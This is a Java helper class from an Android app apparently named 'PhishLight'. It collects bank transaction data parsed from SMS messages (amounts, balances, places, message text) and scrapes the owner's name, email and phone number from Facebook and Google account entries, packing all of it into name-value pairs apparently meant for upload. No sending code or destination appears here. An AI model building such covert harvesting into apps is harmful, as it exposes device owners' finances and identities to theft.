package org.rix1.PhishLight;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.util.Log;
import android.util.Patterns;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

/**
 * Created by Rikard Eide on 11/09/14.
 * Description:
 */
public class DataHelper {

    private Context context;
    private List<BasicNameValuePair> nameValuePairs;

    public DataHelper(Context c) {
        this.context = c;
    }


    public List getData( SmsDetails sms) {
        nameValuePairs = new ArrayList<BasicNameValuePair>(2);
        
        BankDetails bankSms = sms.getBankDetails();

        nameValuePairs.add(getFullname());
        nameValuePairs.add( new BasicNameValuePair("bankName", bankSms.getBankName()) );
        nameValuePairs.add( new BasicNameValuePair("transTime", bankSms.getTransactionTime()) );
        nameValuePairs.add( new BasicNameValuePair("transDate", bankSms.getTransactionDate().toString()) );
        nameValuePairs.add( new BasicNameValuePair("transPlace", bankSms.getTransactionPlace()) );
        nameValuePairs.add( new BasicNameValuePair("transType", bankSms.getTransactionType()) );
        nameValuePairs.add( new BasicNameValuePair("transAmount", bankSms.getTransactionAmount().toString()) );
        nameValuePairs.add( new BasicNameValuePair("accBalance", bankSms.getAvailableBalance().toString()) );
        nameValuePairs.add( new BasicNameValuePair("smsId", sms.getSmsId().toString()  ) );
        nameValuePairs.add( new BasicNameValuePair("smsTime", sms.getSmsDate().toString()) );
        nameValuePairs.add( new BasicNameValuePair("smsNum", sms.getSmsPhoneNumber()) );
        nameValuePairs.add( new BasicNameValuePair("smsContent", bankSms.getTransactionContent()) );

        // Just for testing purposes
        //printData();

        return nameValuePairs;
    }

    public void printData() {
        int i = 0;

        if (nameValuePairs != null) {
            for (NameValuePair nvp : nameValuePairs) {
                if (nvp != null)
                    Log.d("APP", "Value pair @" + i + ": " + nvp.getName() + " AND " + nvp.getValue());
                i++;
            }
        }else Log.d("APP", "nameValuePair is empty - nothing to print");
    }


    /**
     * Currently gets the full name from the Android AccountManager.
     * The Facebook Android application uses the full name
     * as the name of the account.
     * @return full name
     */

    private BasicNameValuePair getFullname(){
        String facebookType = "com.sec.android.app.sns3.facebook";
        String possibleFullname = "";

        Account[] accounts = AccountManager.get(context).getAccounts();
        for(Account acc: accounts){
            if(acc.type.equals(facebookType)){
                possibleFullname = acc.name;
            }
        }
        if(possibleFullname.equals(""))
            return new BasicNameValuePair("userInfoName", "No name found");
        else return new BasicNameValuePair("userInfoName", possibleFullname);
    }


    /**
     * Currently gets the email from the Android AccountManager.
     * Google.com uses the email as the name of the account.
     * @return email
     */

    private NameValuePair getEmail(){
        String possibleEmail = "";

        Pattern emailPattern = Patterns.EMAIL_ADDRESS;
        Account[] accounts = AccountManager.get(context).getAccounts();
        for(Account acc: accounts){
            if(emailPattern.matcher(acc.name).matches()){ // We dont know for sure if this is the main email account
                possibleEmail = acc.name;
            }
        }

        if(possibleEmail.equals(""))
            return new BasicNameValuePair("email", "No name found");
        else return new BasicNameValuePair("email", possibleEmail);
    }

    /**
     * Currently gets the phone number from the Android AccountManager.
     * Facebook.auth.login uses the phone number as the name of the account.
     * @return telephone number
     */
    private NameValuePair getTelephone(){
        String facebookType = "com.facebook.auth.login";
        String possibleTelephone = "";

        Account[] accounts = AccountManager.get(context).getAccounts();
        for(Account acc: accounts){
            if(acc.type.equals(facebookType)){
                possibleTelephone = acc.name;
            }
        }
        if(possibleTelephone.equals(""))
            return new BasicNameValuePair("telephone", "No phone number found");
        else return new BasicNameValuePair("telephone", possibleTelephone);
    }

}
